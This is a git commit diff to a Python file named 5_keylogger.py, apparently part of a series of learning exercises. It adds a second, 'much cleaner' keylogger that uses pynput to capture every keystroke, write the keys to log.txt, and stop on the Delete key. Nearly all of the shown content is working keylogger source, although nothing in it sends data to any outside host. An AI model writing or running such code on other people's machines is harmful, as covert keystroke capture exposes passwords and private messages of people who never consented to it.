e90d887db2adbec935f29f3f113fed4af295dad4
Sanchez C <73430419+topherskie@users.noreply.github.com>
2021-10-03 16:33:53 +0800

    Update 5_keylogger.py

--- 5_keylogger.py
+++ 5_keylogger.py
@@ -13,3 +13,35 @@ def on_press_key(key):
 
 with Listener(on_press=on_press_key) as listener:
     listener.join()
+
+    # ==========================================================================================================================
+    # much cleaner key logger
+import pynput
+from pynput.keyboard import Key, Listener
+
+
+keys = []
+
+
+def on_press(key):
+	keys.append(key)
+	write_file(keys)
+
+
+def write_file(keys):
+	with open('log.txt', 'w') as f:
+		for key in keys:
+			#removing ''
+			k = str(key).replace("'", "")
+			f.write(k)
+			#explicitly adding a space after every keystroke for readability
+			f.write(' ')
+
+
+def on_release(key):
+	if key == Key.delete:
+		return False
+
+
+with Listener(on_press = on_press, on_release = on_release) as listener:
+	listener.join()
